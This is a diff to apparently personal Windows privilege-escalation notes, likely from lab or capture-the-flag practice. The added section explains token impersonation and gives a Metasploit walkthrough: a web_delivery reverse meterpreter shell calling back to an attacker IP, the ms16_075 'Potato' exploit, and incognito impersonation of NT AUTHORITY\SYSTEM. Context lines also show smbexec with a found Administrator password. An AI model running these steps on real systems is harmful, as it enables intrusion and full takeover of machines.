@@ -3,6 +3,7 @@
 1. [Kernel Exploits](#kernel-exploits)
 2. [Passwords and Port Forwarding](#passwords-and-port-forwarding)
 3. [Windows Subsystem for Linux](#windows-subsystem-for-linux)
+4. [Impersonation and Potato Attacks](#impersonation-and-potato-attacks)
 
 ## Kernel Exploits
 
@@ -160,4 +161,77 @@ history
 #on attacker machine
 smbexec.py Administrator:'passwordfound'@10.10.10.97
 #gives us a semi-shell as System
+```
+
+## Impersonation and Potato Attacks
+
+* Tokens - temporary keys that allow access to system/network without using creds.
+
+* Types of tokens:
+
+  * Delegate - logging into machine, using RDP
+
+  * Impersonate - 'non-interactive', like attaching network drive or domain logon script
+
+* Token impersonation - impersonate another user logged onto system.
+
+* Certain enabled privileges, which can be found out by ```whoami /priv```, can be [impersonation privileges](https://github.com/gtworek/Priv2Admin).
+
+* An example of a Potato attack would be [Juicy Potato](https://github.com/ohpe/juicy-potato), which exploits the enabled ```SeImpersonate``` or ```SeAssignPrimaryToken``` privileges:
+
+```shell
+whoami /priv
+#SeImpersonatePrivilege enabled
+
+#in attacker machine
+msfconsole -q
+
+use exploit/multi/script/web_delivery
+
+options
+
+show targets
+
+set target 2
+#powershell
+
+set payload windows/meterpreter/reverse_tcp
+#x64 does not work
+
+set LHOST 10.10.14.3
+
+set srvhost 10.10.14.3
+
+run
+#this gives us a powershell command to run
+#run the command in victim shell
+#we get a meterpreter shell
+
+sessions 1
+
+getuid
+#kohsuke
+#now we can try potato exploit
+
+background
+
+use exploit/windows/local/ms16_075_reflection
+
+options
+
+set LHOST 10.10.14.3
+
+set LPORT 5555
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+load incognito
+
+list_tokens -u
+#we have impersonate token
+
+impersonate_token "NT AUTHORITY\SYSTEM"
+
+shell
+#we get shell as System
 ```
